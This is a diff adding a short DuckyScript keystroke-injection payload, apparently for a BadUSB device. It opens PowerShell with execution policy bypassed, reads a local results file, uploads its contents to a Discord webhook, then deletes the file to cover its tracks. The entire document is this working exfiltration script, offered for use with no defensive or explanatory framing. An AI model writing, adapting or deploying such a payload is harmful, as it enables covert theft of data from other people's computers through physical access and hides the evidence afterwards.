@@ -1,0 +1,61 @@
+REM This script sends the file to your discord webook and deletes the file from the pc
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 2000
+
+REM Set Discord Webhook URL
+STRING $webhookUrl = "YOUR_DISCORD_WEBHOOK"
+ENTER
+DELAY 1000
+
+REM Set output file path
+STRING $outputFile = "C:\PATH\TO\YOUR\results.txt"
+ENTER
+DELAY 1000
+
+REM Define the boundary for multipart form data
+STRING $boundary = "------------------------$(Get-Random)"
+ENTER
+DELAY 1000
+
+REM Create the multipart content
+STRING $fileContent = [System.IO.File]::ReadAllBytes($outputFile)
+ENTER
+DELAY 1000
+
+STRING $body = "--$boundary`r`n"
+ENTER
+DELAY 1000
+
+STRING $body += "Content-Disposition: form-data; name=`"file`"; filename=`"results.txt`"`r`n"
+ENTER
+DELAY 1000
+
+STRING $body += "Content-Type: text/plain`r`n`r`n"
+ENTER
+DELAY 1000
+
+STRING $body += [System.Text.Encoding]::ASCII.GetString($fileContent) + "`r`n"
+ENTER
+DELAY 1000
+
+STRING $body += "--$boundary--`r`n"
+ENTER
+DELAY 1000
+
+REM Send the request
+STRING Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{ "Content-Type" = "multipart/form-data; boundary=$boundary" } -Body $body
+ENTER
+DELAY 1000
+
+REM Delete the file after uploading
+STRING Remove-Item -Path $outputFile
+ENTER
+DELAY 1000
+
+REM Close PowerShell
+STRING Exit
+ENTER
